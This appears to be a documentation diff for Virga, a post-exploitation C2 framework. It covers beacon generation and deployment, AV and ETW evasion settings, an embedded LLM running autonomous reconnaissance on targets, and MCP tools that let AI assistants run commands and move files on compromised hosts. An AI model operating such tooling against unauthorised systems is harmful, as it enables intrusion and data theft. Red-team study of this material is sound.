+memdb SELECT * FROM commands WHERE module='llama' LIMIT 10
+memdb SELECT * FROM commands WHERE module='shell' LIMIT 10
+```
+
+##### Output Format
+
+* List views show truncated content for readability
+* Response text is limited to 5 lines in list view
+* Commands are limited to first 3 in list view
+* Use `get` command to view complete untruncated content
+* Command execution results (exit codes, errors, output) are shown when available
+
+### Beacon Management
+
+#### `beacons`
+
+Manages the configuration of the currently active beacon.
+
+* **Usage**: `beacons <subcommand> [args]`
+* **Subcommands**:
+  * `list`: Shows the current beacon configuration (sleep, jitter, etc.).
+  * `set-sleep <seconds>`: Changes the beacon's sleep time.
+  * `set-jitter <percent>`: Changes the beacon's jitter percentage.
+
+---
+
+---
+url: /virga/guide/installation.md
+---
+# Installation
+
+This guide provides instructions for installing and building Virga from source.
+
+## Prerequisites
+
+Before you begin, ensure you have the following software installed on your system:
+
+* **Go**: Version 1.21 or higher.
+* **Git**: For cloning the source code repository.
+* **Make**: For using the provided `Makefile` to simplify the build process.
+* **A C Compiler**: Such as GCC or Clang, which is required for CGO support (necessary for some dependencies).
+
+```bash
+
+# install C compiler for Windows
+sudo apt install -y g++-mingw-w64-x86-64
+sudo apt install -y mingw-w64-x86-64-dev
+
+# set the default g++ compiler for Windows
+sudo update-alternatives --config x86_64-w64-mingw32-g++
+# output:
+There are 2 choices for the alternative x86_64-w64-mingw32-g++ (providing /usr/bin/x86_64-w64-mingw32-g++).
+
+  Selection    Path                                   Priority   Status
+------------------------------------------------------------
+  0            /usr/bin/x86_64-w64-mingw32-g++-win32   60        auto mode
+* 1            /usr/bin/x86_64-w64-mingw32-g++-posix   30        manual mode
+  2            /usr/bin/x86_64-w64-mingw32-g++-win32   60        manual mode
+
+Press <enter> to keep the current choice[*], or type selection number: 1
+
+# set the default gcc compiler for Windows
+sudo update-alternatives --config x86_64-w64-mingw32-gcc
+# output:
+There are 2 choices for the alternative x86_64-w64-mingw32-gcc (providing /usr/bin/x86_64-w64-mingw32-gcc).
+
+  Selection    Path                                   Priority   Status
+------------------------------------------------------------
+  0            /usr/bin/x86_64-w64-mingw32-gcc-win32   60        auto mode
+* 1            /usr/bin/x86_64-w64-mingw32-gcc-posix   30        manual mode
+  2            /usr/bin/x86_64-w64-mingw32-gcc-win32   60        manual mode
+
+Press <enter> to keep the current choice[*], or type selection number: 1
+
+```
+
+## Building from Source
+
+This is the standard method for installing Virga
+
+### 1. Clone the Repository
+
+First, clone the repository from GitHub to your local machine:
+
+```bash
+git clone https://github.com/r74tech/virga.git
+cd virga
+```
+
+### 2. Build the Binaries
+
+The project includes a `Makefile` that automates the build process.
+
+To build all server and client components, run:
+
+```bash
+make build
+```
+
+This command compiles the following binaries and places them in the `./bin` directory:
+
+* `virga-server`: The main C2 server.
+* `virga-cli`: The command-line interface for interacting with the server.
+* `virga-mcp-stdio`: An optional server for the Model Context Protocol (MCP) over standard I/O.
+
+### 3. Install AI Dependencies (Optional)
+
+If you plan to use the AI features, you must download the required model files and libraries. The `Makefile` provides a convenient target for this.
+
+```bash
+# This will download the model and libraries for your current OS/architecture
+make download-llama-all
+make deps
+```
+
+This command will populate the `internal/implant/llama/models` and `internal/implant/llama/libs` directories.
+
+### 4. Generate Secure Encryption Keys (Recommended)
+
+For production deployments, it's critical to generate and use your own encryption keys instead of the default ones:
+
+```bash
+make generate-key
+```
+
+This will generate secure AES-256 encryption keys and provide instructions on how to use them. You can either:
+
+* Set the key as an environment variable: `export VIRGA_ENCRYPTION_KEY='<your-key-here>'`
+* Add it to your configuration file under the `encryption` section
+
+> **⚠️ Security Warning**: Never use the default encryption key in production environments. Always generate a unique key for each deployment.
+
+## Verifying the Installation
+
+After the build process is complete, you can verify that the components were built correctly.
+
+1. **Check for Binaries**: List the contents of the `./bin` directory to ensure the server and CLI executables are present.
+
+   ```bash
+   ls -l bin/
+   ```
+
+2. **Run the Server**: Start the server with the default configuration file.
+
+   ```bash
+   ./bin/virga-server --config configs/server.yaml
+   ```
+
+   If successful, you will see a message indicating the server has started.
+
+3. **Connect with the CLI**: In a separate terminal, connect to the running server.
+
+   ```bash
+   ./bin/virga-cli --host localhost --port 8443
+   ```
+
+   You should be greeted with the `virga>` prompt.
+
+## Uninstallation
+
+To uninstall Virgaply remove the project directory that you cloned from GitHub.
+
+```bash
+# Navigate out of the project directory
+cd ..
+
+# Remove the directory and all its contents
+rm -rf virga/
+```
+
+---
+
+---
+url: /virga/guide/introduction.md
+---
+# Introduction
+
+Welcome to Virga! This document provides a high-level overview of the framework and its capabilities.
+
+## What is Virga
+
+Virga lightweight, post-exploitation C2 (Command and Control) framework designed for security professionals. It is built with Go for high performance and cross-platform compatibility, supporting Windows, Linux, and macOS.
+
+A key feature of Virgats integrated AI, powered by an embedded LLM. This allows for autonomous operations, such as reconnaissance and data analysis, directly on the target system.
+
+## Architecture Overview
+
+```mermaid
+flowchart TB
+    subgraph Operator["🖥️ Operator Workstation"]
+        CLI["CLI Client<br/>(virga-cli)"]
+    end
+    
+    subgraph Server["🌐 C2 Infrastructure"]
+        API["Admin API<br/>:8443"]
+        HTTP["HTTP Listener<br/>:8080"]
+        HTTPS["HTTPS Listener<br/>:443"]
+        Core["Server Core"]
+        DB[("SQLite DB")]
+        MCP["MCP Servers<br/>STDIO/SSE/Stream"]
+    end
+    
+    subgraph Targets["🎯 Target Systems"]
+        Win["Windows Beacon<br/>+ LLM"]
+        Linux["Linux Beacon<br/>+ LLM"]
+        Mac["macOS Beacon<br/>+ LLM"]
+    end
+    
+    CLI -.->|"TLS"| API
+    API --> Core
+    Core --> DB
+    Core --> MCP
+    
+    Win -->|"AES-256-GCM"| HTTP
+    Linux -->|"AES-256-GCM"| HTTPS
+    Mac -->|"AES-256-GCM"| HTTP
+    
+    HTTP --> Core
+    HTTPS --> Core
+    
+    style Operator fill:#2d3748,stroke:#1a202c,color:#fff
+    style Server fill:#3c8772,stroke:#2d6659,color:#fff
+    style Targets fill:#e53e3e,stroke:#c53030,color:#fff
+```
+
+## Next Steps
+
+* To install Virgaceed to the [Installation](/guide/installation) guide.
+* To get hands-on experience, follow the [Quick Start](/guide/quick-start) tutorial.
+
+---
+
+---
+url: /virga/guide/listeners.md
+---
+# Listeners
+
+Listeners are the components of the Virga server that wait for incoming connections from beacons. You can configure multiple listeners of different types to handle various communication channels.
+
+## Key Concepts
+
+* **Binding**: Each listener is bound to a specific IP address and port on the server.
+* **Protocol**: Listeners can be configured to use different protocols, primarily HTTP and HTTPS.
+* **Encryption**: All communication is encrypted at the application layer, providing an additional layer of security on top of any transport-level encryption (like TLS).
+
+## Basic Configuration
+
+Listeners are defined in the `listeners` array in your `config.yaml` file. Here is a basic example of an HTTP listener:
+
+```yaml
+listeners:
+  - name: "default-http"
+    type: "http"
+    bind_address: "0.0.0.0"
+    port: 8080
+    uri_path: "api/updates"
+    encryption:
+      type: "aes-256"
+      key: "your-super-secret-key"
+```
+
+### Core Fields
+
+* `name`: A unique name for the listener.
+* `type`: The protocol type. Currently, `http` and `https` are supported.
+* `bind_address`: The IP address to listen on. `0.0.0.0` listens on all available network interfaces.
+* `port`: The port to listen on.
+* `uri_path`: The specific URL path that the beacon will connect to (e.g., `http://c2.example.com/api/updates`).
+
+### Encryption
+
+* `encryption.type`: The encryption algorithm. Only `aes-256` is currently supported.
+* `encryption.key`: The secret key for encrypting traffic.
+  > **⚠️ CRITICAL WARNING:** You **MUST** use a unique, strong key for each deployment. See the [Security Guide](/guide/security) for more information.
+
+### HTTPS Configuration
+
+To use HTTPS, you must set `type: "https"` and provide paths to your SSL/TLS certificate and key files:
+
+```yaml
+listeners:
+  - name: "primary-https"
+    type: "https"
+    bind_address: "0.0.0.0"
+    port: 443
+    uri_path: "api/v2/updates"
+    ssl:
+      cert: "/path/to/fullchain.pem"
+      key: "/path/to/privkey.pem"
+    encryption:
+      # ... (encryption settings)
+```
+
+For a complete list of all configuration options, see the [Server Configuration Reference](/reference/server-config-reference).
+
+---
+
+---
+url: /virga/usage/mcp-integration.md
+---
+# MCP Integration
+
+This document describes how to use the Model Context Protocol (MCP) integration in Virga, which enables AI/LLM tools to interact with the C2 framework through multiple transport protocols.
+
+## Overview
+
+The Model Context Protocol (MCP) is an open standard that allows AI assistants and LLM tools to securely interact with external systems. Virga implements MCP to enable:
+
+* AI-powered security analysis and automation
+* Interactive session management through AI assistants
+* Natural language command execution
+* Intelligent data querying and analysis
+
+## Architecture
+
+Virga's MCP implementation supports three transport protocols, each suited for different use cases:
+
+### Transport Comparison
+
+| Feature              | SSE                | STDIO           | Streamable      |
+| -------------------- | ------------------ | --------------- | --------------- |
+| **Tools**            | 9 tools            | 9 tools         | 14 tools        |
+| **Resources**        | 7 (with templates) | 3 (static only) | 4               |
+| **Protocol**         | HTTP + SSE         | Process I/O     | HTTP Stateful   |
+| **Real-time**        | Yes (events)       | No (sync)       | Yes (streaming) |
+| **Best for**         | Web clients        | CLI tools       | Custom apps     |
+| **Interactive Mode** | No                 | No              | Yes             |
+| **Port Required**    | Yes (8444)         | No              | Yes (50012)     |
+
+```mermaid
+graph TB
+    subgraph "AI/LLM Tools"
+        A[Claude Desktop]
+        B[Custom AI Client]
+        C[CLI Tools]
+    end
+
+    subgraph "MCP Transports"
+        D[SSE Server<br/>Port 8444]
+        E[STDIO Server<br/>Process]
+        F[Streamable Server<br/>Port 50012]
+    end
+
+    subgraph "Virga Core"
+        G[Session Manager]
+        H[Beacon Manager]
+        I[Database]
+        J[Task Executor]
+    end
+
+    A --> D
+    B --> D
+    B --> F
+    C --> E
+
+    D --> G
+    D --> H
+    D --> I
+    E --> G
+    E --> H
+    E --> I
+    F --> G
+    F --> H
+    F --> I
+
+    G --> J
+    H --> J
+
+    style A fill:#9b59b6,color:#fff
+    style B fill:#3498db,color:#fff
+    style C fill:#2ecc71,color:#fff
+    style D fill:#e74c3c,color:#fff
+    style E fill:#f39c12,color:#fff
+    style F fill:#1abc9c,color:#fff
+```
+
+## Transport Protocols
+
+### 1. SSE (Server-Sent Events)
+
+Best for web-based clients and real-time event streaming.
+
+**Features:**
+
+* HTTP-based with event streaming
+* Suitable for browser integration
+* Real-time updates
+* Firewall-friendly
+
+**Default Configuration:**
+
+```yaml
+mcp:
+    sse_base_path: /mcp
+    sse_enabled: true
+    sse_port: :8444
+    remote_enabled: false
+    remote_base_url: http://localhost:8444
+```
+
+### 2. STDIO (Standard Input/Output)
+
+Best for CLI tools and local integrations.
+
+**Features:**
+
+* JSON-RPC over standard I/O
+* Process-based communication
+* Synchronous request/response
+* Ideal for scripting
+
+**Default Configuration:**
+
+```yaml
+mcp:
+    stdio_enabled: false
+```
+
+### 3. Streamable
+
+Best for high-performance, custom integrations.
+
+**Features:**
+
+* Binary protocol support
+* Bidirectional streaming
+* Low latency
+* Custom protocol implementation
+
+**Default Configuration:**
+
+```yaml
+mcp:
+    streamable_enabled: true
+    streamable_port: :50012
+```
+
+## Configuration
+
+### Server Configuration
+
+Add MCP settings to your `configs/server.yaml`:
+
+```yaml
+# MCP Configuration
+mcp:
+    enabled: true
+    # SSE transport settings
+    sse_enabled: true
+    sse_port: :8444
+    sse_base_path: /mcp
+
+    # STDIO transport settings
+    stdio_enabled: false  # Enable for CLI usage
+
+    # Streamable transport settings
+    streamable_enabled: true
+    streamable_port: :50012
+
+    # Remote access settings (for SSE)
+    remote_enabled: false
+    remote_base_url: http://localhost:8444
+```
+
+### Starting MCP Servers
+
+MCP servers start automatically with the main Virga server when enabled:
+
+```bash
+# Start Virga with MCP
+./virga-server -config configs/server.yaml
+
+# Output:
+# [INFO] Starting MCP SSE server on :8444...
+# [INFO] MCP SSE server started
+```
+
+## Available Tools
+
+The available tools vary by transport protocol:
+
+### SSE and STDIO Transports (9 tools)
+
+Both SSE and STDIO transports provide the same comprehensive set of tools:
+
+#### Session Management
+
+* **`session_list`** - List all active C2 sessions
+* **`session_command`** - Execute commands in a session
+  * Supports shell commands, Llama AI prompts, and MemDB queries
+  * Use `use_llama: true` for AI interpretation
+  * Prefix with `memdb ` for database queries
+
+#### File Operations
+
+* **`upload_file`** - Upload files to target systems
+* **`download_file`** - Download files from targets
+
+#### System Operations
+
+* **`list_processes`** - List running processes
+* **`kill_process`** - Terminate processes by PID
+* **`get_system_info`** - Gather system information
+
+#### Network Operations
+
+* **`list_network_connections`** - List network connections
+* **`port_forward`** - Set up port forwarding
+
+### Streamable Transport (14 tools)
+
+The Streamable transport includes all the standard tools plus additional real-time capabilities:
+
+#### Core Tools (Same as SSE/STDIO) - 9 tools
+
+* **`session_list`** - List all active C2 sessions
+* **`session_command`** - Execute commands (shell, Llama, MemDB)
+* **`upload_file`** - Upload files to target systems
+* **`download_file`** - Download files from targets
+* **`list_processes`** - List running processes
+* **`kill_process`** - Terminate processes by PID
+* **`get_system_info`** - Gather system information
+* **`list_network_connections`** - List network connections
+* **`port_forward`** - Set up port forwarding
+
+#### Additional Streamable-Only Tools - 5 tools
+
+* **`get_system_status`** - Get Virga system status
+* **`interact_beacon`** - Start interactive session (1-second check-ins)
+* **`stop_interact`** - Stop interactive session (return to 30-second check-ins)
+* **`shell`** - Direct shell command execution (alias for session\_command)
+* **`ls`** - List files (executes `ls -la`)
+
+## Client Integration Examples
+
+### Claude Desktop Integration
+
+1. Install Claude Desktop
+2. Configure MCP in Claude's configuration:
+
+```json
+{
+  "mcpServers": {
+    "virga": {
+      "command": "curl",
+      "args": ["-N", "http://localhost:8444/mcp/events"],
+      "env": {}
+    }
+  }
+}
+```
+
+3. Claude can now interact with your C2 sessions:
+
+```
+"List all active sessions and show me their details"
+"Execute 'whoami' on session-123"
+"Find all PDF files on the target system"
+```
+
+### Python Client Example
+
+```python
+import asyncio
+from mcp import Client
+from mcp.client.sse import SSEClientTransport
+
+async def main():
+    # Create SSE transport
+    transport = SSEClientTransport("http://localhost:8444/mcp")
+
+    # Initialize client
+    async with Client("virga-client", "1.0.0") as client:
+        await client.connect(transport)
+        await client.initialize()
+
+        # List sessions
+        result = await client.call_tool("session_list", {})
+        print(f"Active sessions: {result}")
+
+        # Execute command with AI
+        result = await client.call_tool("session_command", {
+            "session_id": "session-123",
+            "command": "Find and analyze suspicious network connections",
+            "use_llama": True,
+            "temperature": 0.7
+        })
+        print(f"Task ID: {result['task_id']}")
+
+        # Use file operations
+        # Upload a file
+        result = await client.call_tool("upload_file", {
+            "session_id": "session-123",
+            "remote_path": "/tmp/test.txt",
+            "content": "SGVsbG8gV29ybGQ="  # Base64 encoded "Hello World"
+        })
+        print(f"Upload result: {result}")
+
+        # List processes
+        result = await client.call_tool("list_processes", {
+            "session_id": "session-123"
+        })
+        print(f"Processes: {result}")
+
+        # Get system info
+        result = await client.call_tool("get_system_info", {
+            "session_id": "session-123"
+        })
+        print(f"System Info: {result}")
+
+asyncio.run(main())
+```
+
+### JavaScript/TypeScript Example
+
+```typescript
+import { Client } from "@modelcontextprotocol/sdk/client/index.js";
+import { SSEClientTransport } from "@modelcontextprotocol/sdk/client/sse.js";
+
+async function interactWithVirga() {
+  const transport = new SSEClientTransport(
+    new URL("http://localhost:8444/mcp")
+  );
+
+  const client = new Client({
+    name: "virga-js-client",
+    version: "1.0.0",
+  }, {
+    capabilities: { tools: {} }
+  });
+
+  await client.connect(transport);
+
+  // Execute AI-powered analysis
+  const result = await client.callTool({
+    name: "session_command",
+    arguments: {
+      session_id: "session-123",
+      command: "Analyze system for persistence mechanisms",
+      use_llama: true,
+      max_iterations: 5
+    }
+  });
+
+  console.log("Analysis started:", result.task_id);
+}
+```
+
+## Use Cases
+
+### 1. AI-Powered Security Analysis
+
+```python
+# Use AI to analyze a compromised system
+result = await client.call_tool("session_command", {
+    "session_id": session_id,
+    "command": """
+    Perform a comprehensive security analysis:
+    1. Check for suspicious processes
+    2. Identify unusual network connections
+    3. Find recently modified system files
+    4. Look for persistence mechanisms
+    5. Generate a summary report
+    """,
+    "use_llama": True,
+    "max_iterations": 20,
+    "temperature": 0.3
+})
+
+# Or use individual tools for specific tasks
+processes = await client.call_tool("list_processes", {
+    "session_id": session_id
+})
+
+connections = await client.call_tool("list_network_connections", {
+    "session_id": session_id
+})
+
+# Query MemDB through session_command
+history = await client.call_tool("session_command", {
+    "session_id": session_id,
+    "command": "memdb SELECT * FROM commands WHERE exit_code != 0 LIMIT 10"
+})
+```
+
+### 2. Automated Incident Response
+
+```python
+# Automated response to detected threats
+async def respond_to_threat(session_id, threat_info):
+    # Kill malicious process
+    await client.call_tool("kill_process", {
+        "session_id": session_id,
+        "pid": threat_info["pid"]
+    })
+
+    # Download suspicious files for analysis
+    await client.call_tool("download_file", {
+        "session_id": session_id,
+        "remote_path": threat_info.get("executable_path")
+    })
+
+    # Get process information
+    processes = await client.call_tool("list_processes", {
+        "session_id": session_id
+    })
+
+    # Query related data through MemDB
+    await client.call_tool("session_command", {
+        "session_id": session_id,
+        "command": f"memdb SELECT * FROM processes WHERE parent_pid = {threat_info['pid']}"
+    })
+```
+
+### 3. Natural Language Operations
+
+```python
+# Let AI handle complex multi-step operations
+commands = [
+    "Find all user accounts created in the last 30 days",
+    "Check if any of these accounts have administrative privileges",
+    "List all files accessed by these accounts",
+    "Create a timeline of suspicious activities"
+]
+
+for cmd in commands:
+    result = await client.call_tool("session_command", {
+        "session_id": session_id,
+        "command": cmd,
+        "use_llama": True
+    })
+    task_ids.append(result["task_id"])
+```
+
+## Advanced Features
+
+### Llama Integration
+
+Commands can leverage the embedded AI model through the `session_command` tool:
+
+```python
+# AI interprets and executes the intent
+result = await client.call_tool("session_command", {
+    "session_id": "session-123",
+    "command": "Check if this system has been compromised",
+    "use_llama": True,
+    "temperature": 0.5,  # Lower = more focused
+    "max_iterations": 10  # Max reasoning steps
+})
+```
+
+### MemDB Queries
+
+Query the in-memory database directly or through session\_command:
+
+```python
+# Query MemDB via session_command with memdb prefix
+result = await client.call_tool("session_command", {
+    "session_id": "session-123",
+    "command": "memdb SELECT * FROM commands WHERE module = 'shell' LIMIT 10"
+})
+
+# Another MemDB query example
+result = await client.call_tool("session_command", {
+    "session_id": "session-123",
+    "command": "memdb SELECT * FROM processes WHERE name LIKE '%suspicious%'"
+})
+
+# Get MemDB status through session_command
+status = await client.call_tool("session_command", {
+    "session_id": "session-123",
+    "command": "memdb status"
+})
+```
+
+### Resource Access
+
+MCP provides read-only resources that vary by transport:
+
+#### SSE Transport Resources (7 total)
+
+Static resources:
+
+* `sessions://list` - All active sessions
+* `beacons://list` - All configured beacons
+* `system://status` - System status
+
+Dynamic resources (templates):
+
+* `sessions://detail/{session_id}` - Specific session details
+* `beacons://detail/{beacon_id}` - Specific beacon details
+* `history://commands/{session_id}` - Command execution history
+* `files://session/{session_id}` - File operation history
+
+#### STDIO Transport Resources (3 total)
+
+* `sessions-list` - All active sessions
+* `beacons-list` - All configured beacons
+* `system-status` - System status
+
+#### Streamable Transport Resources (4 total)
+
+* `virga://sessions/overview` - Sessions overview
+* `virga://session/{id}/info` - Specific session information
+* `virga://beacons/overview` - Beacons overview
+* `virga://system/stats` - System statistics
+
+Example usage:
+
+```python
+# SSE/STDIO resource access
+resource = await client.read_resource("sessions://list")  # SSE
+resource = await client.read_resource("sessions-list")    # STDIO
+
+# Streamable resource access
+resource = await client.read_resource("virga://sessions/overview")
+resource = await client.read_resource(f"virga://session/{session_id}/info")
+```
+
+## Security Considerations
+
+1. **Authentication**: Currently, MCP servers have limited authentication. Use network-level security:
+   * Bind to localhost only for local integrations
+   * Use VPN or SSH tunnels for remote access
+   * Implement firewall rules
+
+2. **Authorization**: All connected clients have full access. Future versions will add:
+   * Token-based authentication
+   * Role-based access control
+   * Session-level permissions
+
+3. **Encryption**: For production use:
+   * Use HTTPS/TLS for SSE transport
+   * Tunnel STDIO through SSH
+   * Enable transport-level encryption
+
+4. **Input Validation**: The server validates all inputs, but clients should also:
+   * Sanitize user inputs
+   * Validate session IDs
+   * Handle errors gracefully
+
+## Troubleshooting
+
+### SSE Connection Issues
+
+```bash
+# Test SSE endpoint
+curl -N http://localhost:8444/mcp/events
+
+# Check if events are flowing
+# You should see:
+# event: open
+# data: {"id":"...","timestamp":"..."}
+```
+
+### STDIO Communication
+
+```bash
+# Test STDIO server
+echo '{"jsonrpc":"2.0","id":1,"method":"system/info","params":{}}' | \
+  ./virga-server -mcp-stdio
+
+# Enable debug logging
+export VIRGA_LOG_LEVEL=debug
+```
+
+### Common Issues
+
+1. **"Session not found" errors**
+   * Verify session ID is correct
+   * Check if session is still active
+   * Ensure proper connection to C2 server
+
+2. **Timeout errors**
+   * Increase timeout for long operations
+   * Check network connectivity
+   * Verify target system is responsive
+
+3. **JSON parsing errors**
+   * Validate JSON syntax
+   * Check character encoding (UTF-8)
+   * Ensure proper escaping
+
+4. **Tool not found errors**
+   * Verify tool name is correct (e.g., `upload_file` not `file_upload`)
+   * Check transport type (some tools are transport-specific)
+   * Ensure server has MCP enabled
+
+5. **Tool naming**
+   * Use exact tool names as documented
+   * Common mistakes: `file_upload` should be `upload_file`
+   * Check the specific transport's tool list
+
+## Best Practices
+
+1. **Use appropriate transports**:
+   * SSE for web/real-time applications
+   * STDIO for scripts and automation
+   * Streamable for high-performance needs
+
+2. **Handle asynchronous operations**:
+   * Store task IDs for long-running operations
+   * Implement proper polling for results
+   * Handle partial results gracefully
+
+3. **Optimize AI usage**:
+   * Use lower temperatures (0.1-0.3) for precise tasks
+   * Increase iterations for complex analysis
+   * Cache results to avoid redundant processing
+
+4. **Monitor resource usage**:
+   * MCP operations can be resource-intensive
+   * Monitor memory usage with AI operations
+   * Implement rate limiting for production
+
+## Future Enhancements
+
+Planned improvements for MCP integration:
+
+1. **WebSocket support** for bidirectional streaming
+2. **GraphQL API** for flexible queries
+3. **Batch operations** for efficiency
+4. **Event subscriptions** for real-time updates
+5. **Plugin system** for custom tools
+6. **Audit logging** for compliance
+
+## References
+
+* [Model Context Protocol Specification](https://github.com/modelcontextprotocol/modelcontextprotocol)
+* [go-mcp Library Documentation](https://github.com/ThinkInAIXYZ/go-mcp)
+* [Virga API Reference](/reference/api-reference)
+* [Session Management Guide](/guide/sessions)
+
+---
+
+---
+url: /virga/guide/quick-start.md
+---
+# Quick Start
+
+This guide provides a step-by-step tutorial to get your first beacon up and running.
+
+## Step 1: Create Server Configuration
+
+Create a configuration file named `config.yaml`. You can start with this minimal configuration:
+
+```yaml
+# config.yaml
+server:
+  host: "0.0.0.0"
+  admin_port: 8443
+
+database:
+  path: "data/virga.db"
+
+listeners:
+  - name: "default-http"
+    type: "http"
+    bind_address: "0.0.0.0"
+    port: 8080
+    uri_path: "api/updates"
+    encryption:
+      type: "aes-256"
+      key: "change-this-key-in-production-environment"
+```
+
+> **⚠️ Security Warning:** You **MUST** change the default `encryption.key` for any real deployment. See the [Security Guide](/guide/security) for more details.
+
+Change server.host to your public IP address or domain name.
+
+```bash
+make update-ip
+```
+
+This will update the server.host, listeners.bind\_address in the config.yaml and beacon.c2.host in the beacon.yaml file to your public IP address or domain name.
+
+## Step 2: Start the Server
+
+Launch the server with the configuration file:
+
+```bash
+make run-server
+```
+
+## Step 3: Connect with the CLI
+
+Before running the CLI, you can adjust the log level to control the verbosity of output. To do this, edit the `Makefile` and modify the `CLI_ARGS` variable:
+
+```Makefile
+# Choose your preferred log level:
+# - info: Standard logging for production use (default)
+# - debug: Verbose output for troubleshooting and development
+# - off: Disable logging for quiet operation
+CLI_ARGS ?= --log-level info
+```
+
+After configuring the log level, connect to the server's admin interface in a new terminal:
+
+```bash
+make run-cli
+```
+
+
+You will be greeted by the `virga>` prompt in interactive mode.
+
+## Step 4: Generate Your First Beacon
+
+From the CLI, use the `generate` command to create a beacon. This example creates a beacon for Windows that connects to your local HTTP listener.
+
+```bash
+virga> generate beacon --os windows --arch amd64 --http localhost --port 8080 --output beacon.exe
+```
+
+## Step 5: Deploy and Test
+
+1. Transfer the generated `beacon.exe` to a test machine.
+2. Execute it.
+3. Back in the Virga CLI, check for the new session using `sessions list`.
+
+```bash
+virga> sessions list
+ID                                   IP              Hostname        Last Seen
+--------------------------------------------------------------------------------
+a1b2c3d4-e5f6-7890-abcd-ef1234567890 192.168.1.10    TEST-PC         ...
+```
+
+## Step 6: Interact with the Session
+
+Use the `interact` command with the session ID to take control.
+
+```bash
+virga> interact a1b2c3d4-e5f6-7890-abcd-ef1234567890
+[*] Now interacting with session a1b2c3d4-e5f6-7890-abcd-ef1234567890 (TEST-PC)
+
+virga (a1b2c3d4)> exec whoami
+[*] Executing command: whoami
+test-pc\user
+```
+
+To exit the interaction context, type `background` or `bg`.
+
+## What's Next?
+
+Congratulations on deploying your first beacon! Now you can explore more advanced topics:
+
+* Learn about [Beacon Generation](/usage/beacon-generation) in more detail.
+* Discover the [AI Features](/usage/ai-features).
+* Consult the [CLI Command Reference](/reference/cli-command-reference) for a full list of commands.
+
+---
+
+---
+url: /virga/reference/server-config-reference.md
+---
+# Server Configuration
+
+This guide provides detailed information about configuring the Virga C2 server.
+
+## Configuration Overview
+
+The Virgaer uses a YAML configuration file that controls:
+
+* Server binding and ports
+* Database settings
+* Listener configuration
+* Generator settings
+* Logging options
+* MCP integration
+
+## Configuration Architecture
+
+```mermaid
+graph TB
+    subgraph Config["📄 config.yaml"]
+        Server["Server Settings<br/>• Host & Ports<br/>• Timeouts<br/>• Logging"]
+        DB["Database<br/>• SQLite Path<br/>• Connection Pool"]
+        Listeners["Listeners<br/>• HTTP/HTTPS<br/>• Encryption<br/>• URI Paths"]
+        Generator["Generator<br/>• Build Paths<br/>• LLM Models"]
+        MCP["MCP Settings<br/>• STDIO<br/>• SSE<br/>• Streamable"]
+    end
+    
+    subgraph Runtime["🚀 Runtime"]
+        Core["Server Core"]
+        HTTP["HTTP Server"]
+        HTTPS["HTTPS Server"]
+        AdminAPI["Admin API"]
+        SQLite[("SQLite DB")]
+        MCPServers["MCP Servers"]
+    end
+    
+    Server --> Core
+    DB --> SQLite
+    Listeners --> HTTP
+    Listeners --> HTTPS
+    Server --> AdminAPI
+    Generator --> Core
+    MCP --> MCPServers
+    
+    style Config fill:#3498db,stroke:#2980b9,color:#fff
+    style Runtime fill:#3c8772,stroke:#2d6659,color:#fff
+```
+
+## Configuration File Structure
+
+### Complete Configuration Example
+
+```yaml
+# config.yaml
+
+# Server core settings
+server:
+  # Network binding
+  host: "0.0.0.0"              # Bind address
+  admin_port: 8443              # Admin API port
+  
+  # Session management
+  session_timeout: "30m"        # Inactive session timeout
+  
+  # Logging
+  log_level: "info"             # debug, info, warn, error, off
+  log_path: "logs/server.log"   # Log file path
+
+# Database configuration (SQLite only)
+database:
+  type: "sqlite3"               # Database type
+  path: "data/virga.db"    # Database file path
+
+# Listener configuration
+listeners:
+  - name: "primary-https"
+    type: "https"               # http or https
+    bind_address: "0.0.0.0"
+    port: 443
+    
+    # URI configuration
+    uri_path: "api/updates"     # Beacon check-in path
+    
+    # SSL/TLS settings (HTTPS only)
+    ssl:
+      cert: "/path/to/server.crt"
+      key: "/path/to/server.key"
+      
+    # Encryption settings
+    encryption:
+      type: "aes-256"
+      key: "your-encryption-key-here"  # Any string (normalized to 32 bytes)
+      
+  - name: "backup-http"
+    type: "http"
+    bind_address: "0.0.0.0"
+    port: 8080
+    uri_path: "api/updates"
+    encryption:
+      type: "aes-256"
+      key: "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
+
+# Generator settings (for beacon generation)
+generator:
+  user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
+  initial_sleep: 60             # Initial sleep time in seconds
+  jitter: 20                    # Jitter percentage
+  obfuscation: true             # Enable obfuscation
+  anti_av: true                 # Anti-AV features
+  anti_etw: true                # Anti-ETW features
+  self_delete: false            # Self-delete after execution
+
+# MCP (Model Context Protocol) settings
+mcp:
+  enabled: true                 # Enable MCP support
+
+  # SSE transport
+  sse_enabled: true
+  sse_port: ":8444"
+  sse_base_path: "/mcp"
+
+  # Standard I/O transport
+  stdio_enabled: false
+
+  # Remote transport
+  remote_enabled: true
+  remote_base_url: "http://localhost:8444"
+
+  # Streamable transport
+  streamable_enabled: true
+  streamable_port: ":50012"
+```
+
+## Configuration Sections
+
+### Server Settings
+
+The server section controls the core server behavior:
+
+```yaml
+server:
+  host: "0.0.0.0"              # Listen on all interfaces
+  admin_port: 8443              # Admin API port
+  session_timeout: "30m"        # Session timeout duration
+  log_level: "info"             # Logging level
+  log_path: "logs/server.log"   # Log file location
+```
+
+**Fields:**
+
+* `host`: IP address to bind to (default: "0.0.0.0")
+* `admin_port`: Port for admin API and CLI connections
+* `session_timeout`: Duration string for inactive session cleanup
+* `log_level`: One of: debug, info, warn, error
+* `log_path`: Path to log file
+
+### Database Configuration
+
+Currently, only SQLite3 is supported:
+
+```yaml
+database:
+  type: "sqlite3"
+  path: "data/virga.db"
+```
+
+**Fields:**
+
+* `type`: Must be "sqlite3"
+* `path`: Path to SQLite database file
+
+### Listener Configuration
+
+Listeners handle incoming beacon connections. For a conceptual overview and setup guide, see the [Listeners Guide](/guide/listeners.md).
+
+The `listeners` block in `config.yaml` is an array of listener objects. See the guide for examples.
+
+### Generator Settings
+
+Controls default settings for beacon generation. These settings can be overridden during manual generation.
+
+```yaml
+generator:
+  user_agent: "Mozilla/5.0..."
+  initial_sleep: 60
+  jitter: 20
+  obfuscation: true
+  anti_av: true
+  anti_etw: true
+  self_delete: false
+```
+
+**Fields:**
+
+* `user_agent`: Default User-Agent string for HTTP(S) beacons.
+* `initial_sleep`: Default initial sleep time in seconds for the beacon.
+* `jitter`: Default jitter percentage (0-100) to randomize sleep intervals.
+* `obfuscation`: (Default: `true`) Enable code obfuscation in the generated beacon.
